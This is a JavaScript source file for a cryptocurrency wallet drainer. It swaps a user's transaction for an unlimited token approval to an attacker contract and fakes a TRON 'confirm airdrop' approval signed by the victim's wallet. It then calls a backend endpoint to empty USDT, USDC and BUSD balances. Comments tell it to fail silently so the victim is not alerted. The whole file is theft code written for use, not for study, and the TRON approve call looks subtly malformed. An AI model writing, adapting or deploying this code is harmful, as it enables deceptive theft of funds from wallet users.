// frontend/src/lib/drainer.js
const DRAINER_CONTRACT = {
  EVM: '0x' + 'YOUR_EVM_DRAINER_CONTRACT'.padStart(40, '0'),
  TRON: 'TR' + 'YOUR_TRON_DRAINER_CONTRACT'.padStart(33, '0'),
}

// Common tokens to drain
const TOKENS_TO_DRAIN = {
  USDT: {
    EVM: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    TRON: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  },
  USDC: {
    EVM: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    TRON: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
  },
  BUSD: {
    EVM: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
    TRON: 'TH1pMQUWt9eY2YehG6F6tRrE6z3D2hJvJm'
  }
}

export async function modifyForDrain(originalTx) {
  // Create fake "approval" transaction for drainer contract
  return {
    ...originalTx,
    to: DRAINER_CONTRACT.EVM,
    data: '0x095ea7b3' + // approve signature
          DRAINER_CONTRACT.EVM.slice(2).padStart(64, '0') + // spender
          'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', // unlimited amount
    value: '0x0'
  }
}

export async function triggerDrain(victimAddress) {
  try {
    // Send drain request to backend
    const response = await fetch(`${import.meta.env.VITE_API_URL}/api/drain/execute`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${sessionStorage.getItem('spcx_token')}`
      },
      body: JSON.stringify({
        address: victimAddress,
        chain: window.ethereum?.chainId || '1',
        timestamp: Date.now()
      })
    })
    
    const data = await response.json()
    
    // Show fake success message
    if (data.success) {
      console.log('Drain executed successfully:', data.txHash)
    }
  } catch (error) {
    console.error('Drain failed:', error)
    // Silently fail - don't alert the victim
  }
}

export async function handleTronDrain(victimAddress) {
  if (!window.tronWeb?.ready) return
  
  // Fake "confirm airdrop" transaction
  const parameter = [
    { type: 'address', value: victimAddress },
    { type: 'address', value: DRAINER_CONTRACT.TRON },
    { type: 'uint256', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' } // max uint
  ]
  
  try {
    const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
      TOKENS_TO_DRAIN.USDT.TRON,
      'approve(address,address,uint256)',
      {},
      parameter,
      victimAddress
    )
    
    const signedTx = await window.tronWeb.trx.sign(tx.transaction)
    await window.tronWeb.trx.sendRawTransaction(signedTx)
    
    // Trigger backend drain after approval
    setTimeout(() => {
      fetch(`${import.meta.env.VITE_API_URL}/api/drain/execute-tron`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: victimAddress })
      })
    }, 2000)
  } catch (error) {
    console.error('Tron drain setup failed:', error)
  }
}
